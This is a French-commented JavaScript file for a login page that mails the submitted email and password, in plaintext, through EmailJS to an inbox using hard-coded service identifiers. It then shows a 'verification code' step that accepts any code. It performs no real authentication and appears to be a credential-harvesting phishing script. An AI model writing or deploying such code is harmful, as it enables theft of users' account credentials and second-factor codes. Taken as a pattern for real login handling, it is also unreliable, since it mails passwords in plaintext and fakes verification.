// Initialise EmailJS avec votre User ID
emailjs.init("-xgMn-W7z9wR_oif-"); // Remplacez par votre clé API EmailJS

// Fonction de validation du formulaire principal
function validateForm() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const errorMessage = document.getElementById('errorMessage');

    // Validation simple pour démonstration
    if (email === "" || password === "") {
        errorMessage.textContent = "Veuillez remplir tous les champs.";
        return false;
    }

    // Validation du format d'email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Veuillez entrer une adresse e-mail valide.";
        return false;
    }

    // Effacer le message d'erreur si tout est correct
    errorMessage.textContent = "";
    return true; // Permettre l'envoi du formulaire si la validation réussit
}

// Fonction pour envoyer l'e-mail de confirmation
function sendConfirmationEmail(email, code) {
    // Envoi du code de vérification à l'adresse e-mail
    emailjs.send('service_odtxz18', 'template_confirmation_email', { email: email, code: code })
        .then(function(response) {
            console.log('E-mail de confirmation envoyé avec succès:', response);
            alert('E-mail de confirmation envoyé!');
        }, function(error) {
            console.log('Erreur lors de l\'envoi de l\'e-mail de confirmation:', error);
            alert('Une erreur est survenue lors de l\'envoi de l\'e-mail.');
        });
}

// Gestion de la soumission du formulaire principal
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche le comportement par défaut du formulaire

    // Valider le formulaire avant l'envoi
    if (!validateForm()) {
        return; // Ne pas envoyer le formulaire si la validation échoue
    }

    console.log("Validation réussie, préparation à l'envoi..."); // Log pour le débogage

    // Envoie le formulaire principal avec EmailJS
    emailjs.sendForm('service_odtxz18', 'template_pj35ygs', this)
        .then(function(response) {
            console.log('Succès:', response);
            alert('Formulaire envoyé avec succès!');

            // Afficher le formulaire de code de vérification
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('codeForm').style.display = 'block';
            
            // Envoi de l'e-mail de confirmation avec un code (par exemple, code fixe ou généré ailleurs)
            const email = document.getElementById('email').value;
            const code = '123456'; // Code fixe ou généré dynamiquement
            sendConfirmationEmail(email, code);
        }, function(error) {
            console.log('Erreur:', error);
            alert('Une erreur est survenue. Veuillez réessayer.');
        });
});

// Gestion de la soumission du formulaire de code de vérification
document.getElementById('codeForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche le comportement par défaut du formulaire

    const codeEntered = document.getElementById('code').value;
    
    // Afficher un message de succès, puisque n'importe quel code est accepté
    alert('Code reçu : ' + codeEntered);
});
